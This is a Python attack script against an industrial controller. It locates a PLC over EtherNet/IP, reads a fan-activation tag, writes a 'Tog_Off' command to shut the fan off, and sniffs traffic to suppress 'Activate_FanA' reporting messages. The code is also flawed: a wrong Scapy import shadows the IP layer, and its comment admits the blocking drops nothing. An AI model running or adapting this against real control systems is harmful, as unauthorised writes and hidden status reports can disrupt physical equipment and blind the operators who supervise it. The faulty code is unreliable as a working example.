import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from scapy.layers.netflow import IP
import socket
from cpppo.server.enip import client

# Define the reporting message to block
reporting_message_to_block = 'Activate_FanA'

# Function to find the PLC's IP address if it's not known
def find_plc_ip():
    # This could involve scanning the network or using a discovery protocol
    # For simplicity, let's assume you have a list of potential IPs
    potential_ips = ['192.168.1.1', '192.168.1.2']
    for ip in potential_ips:
        # Send a discovery packet and check for a response
        # This step is highly dependent on the specific protocol and device
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 44818))  # 44818 is the default port for EtherNet/IP
            if result == 0:
                return ip
            sock.close()
        except socket.error:
            pass
    return None

# Function to block the reporting message
def block_reporting_message(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP) and packet[IP].dst == plc_ip:
        # Check if the packet contains the reporting message to block
        if reporting_message_to_block.encode() in packet.load:
            # Drop the packet (for demonstration, this doesn't actually drop it, but you get the idea)
            print("Reporting message blocked:", reporting_message_to_block)
            # In a real scenario, you would not forward the packet here

# Main function to start the blocking process and interact with the PLC
def main():
    global plc_ip
    plc_ip = find_plc_ip()
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Create an EtherNet/IP client
        with client.connector(host=plc_ip) as conn:
            # Read the 'Activate_FanA' tag
            activate_fan_a_value = conn.read(['Activate_FanA'])
            print("Activate_FanA value:", activate_fan_a_value)
            
            # Write to the 'Tog_Off' tag to turn off the fan
            conn.write(['Tog_Off'], [True])
            
            # Use Scapy to sniff the network and apply the block_reporting_message function
            scapy.sniff(prn=block_reporting_message, store=False)
    else:
        print("PLC IP address not found")

if __name__ == "__main__":
    main()